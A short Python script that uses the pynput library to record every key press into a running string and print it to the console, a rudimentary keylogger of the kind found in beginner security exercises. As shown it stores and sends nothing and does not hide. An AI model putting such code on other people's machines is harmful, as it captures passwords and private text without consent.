#!/usr/bin/env python
import pynput.keyboard

log = ""
def use_keys(key):
    print(key)

    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " [" + str(key) + "] "
    print(log)

key_rec = pynput.keyboard.Listener(on_press=use_keys)
with key_rec:
    key_rec.join()